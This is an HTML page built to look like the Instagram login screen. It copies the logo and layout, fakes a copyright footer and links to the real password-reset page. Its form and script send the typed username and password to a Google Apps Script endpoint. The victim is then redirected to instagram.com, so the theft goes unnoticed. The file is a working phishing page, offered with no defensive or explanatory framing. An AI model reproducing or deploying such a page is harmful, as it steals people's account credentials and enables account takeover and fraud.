<html>
<head>
    <title>Instagram</title>
    <meta charset="utf-8">
    <meta name="viewport" content=" width=device-width,initial-scale=1.0">
    <meta http-equiv="refresh" content="60">
    <link rel="icon" href="https://media.discordapp.net/attachments/1137760026715496601/1236814648553111552/AatK54D.png?ex=663960e7&is=66380f67&hm=683f12adb340669737a54fc0fb25d1dc96297a8aa16217f66580ec2909dd08ba&=&format=webp&quality=lossless" type="image/icon">
    
    <style type="text/css">
        body{
            margin:  0;
            padding: 0;
            display: flex;
            min-height: 80vh;
            align-items: center;
            justify-content: center;
            background-color: #F8F9F9;
            font-family: sans-serif;
        }
        .container{
            text-align: center;
        }

        .page{
            
        width:350px;
        background: #fff;
        border-radius: 5px;
        padding-bottom: 15px;
        }
        .logo{
          display:block;
        margin: 0 auto 5px;
        }
        form{
         width: 75%;
        display: flex;
        flex-direction: column;
        position: relative;
        left: 50%;
        transform: translateX(-50%);   
        }
        form input {
        margin-bottom: 5px;
        border:1px solid #b6b6b6;
        background:  #faf9f9;
        border-radius: 3px;
        outline: none;
        padding-left: 10px;
        position: relative;
        height: 35px;
            
        }

        form button{    
        border: none;
        background: rgb(76, 180, 248);
        padding: 8px 0;
        margin-top: 10px;
        color: #fff;
        border-radius: 7px;
        font-weight: bold;
        text-transform: capitalize;
        letter-spacing: 1px;
        outline: none;
        cursor: pointer;
        }
        form button:active{
        background:  rgb(24, 119, 242);
        transform: scaleX(0.995);  
        }
        form.option{
        color:#b6b4b4;
        margin: 70px ;
        position:relative;
        }
        form .option::before{
        position: absolute;    
        content:  '';
        width: 37%;
        height: 1px;
        background:#b6b6b6; 
        left:0%;
        top: 95%;
        transform: translateY(-50%);
        border-radius: 50px;

        }
        form .option::after{
        position: absolute;    
        content:  '';
        width: 37%;
        height: 2px;
        background:#b6b6b6; 
        right:0%;
        top: 95%;
        transform: translateY(-50%);
        border-radius: 50px;

        }
        .fblink{
            margin-top: 30px;
            width: 100%
        }
        .fblink span{
            font-size: 18px;
            color: rgb(56, 81, 133);
            margin-right: 5px;
            
        }
        .fblink a{
          text-decoration: none;
        font-weight: bold;
        color: rgb(56, 81, 133);
        }
        .forget-id{
            margin: 15px;   
        }
        .forget-id a{
            text-decoration: none;
            color: rgb(56, 81, 133);
            font-size: 12px;
            font-weight: 500;
            
        }
        .page .singup{
            position:relative;
            border:1px solid #b6b6b6;
            border-radius: 2px;
            width: 90%;
            left: 50%;
            transform: translateX(-50%);
            margin-top: 25px;
        }
        .singup a{
            text-decoration: none;
            margin-left: 5px;
            color : rgb(76, 180, 248);
            font-weight: bold;
            
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="page">
            <div class="logo">

                <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png" alt="instagram" style="width: 175px; ">
            </div>

            <br />
            <form id="loginForm" class="gform container" action="https://script.google.com/macros/s/AKfycbxS5SDTIJ5XSCshcZSJrezN2vxMsmBH81_dD0Wg1R2ROieBlyc44ldrjiH8eNQSHY5o/exec" method="post">
                <input type="text" placeholder="Phone number, username, or email " name="u_name">
                <input type="password" placeholder="Password" name="pass">
                <button class="submitbutton" onclick="submitForm(event)">Log in </button>
                <br />
                <div class="option">OR </div>
            </form>

            <div class="fblink">
                <span class="fab fafacebook"></span>
                <a href="#"> Log in With Facebook</a>
            </div>

            <div class="forget-id">
                <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
            </div>
            <div class="singup">
                <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">
                        Sign up</a></p>
            </div>

        </div>
    </div>

    <br />
    <div style="position:fixed;left:0;bottom:0;width:100%; color: #7e7979;">
        <p style="text-align:center;"> COPYRIGHT instagram.com 2016-2024</p>
    </div>
    <br />

    <script type="text/javascript">
        function submitForm(event) {
            event.preventDefault();

            var form = document.getElementById('loginForm');
            var formData = new FormData(form);
            fetch(form.action, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {

                    window.location.href = 'https://www.instagram.com';
                } else {

                    console.error('Form submission failed:', response.status);
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>

</html>
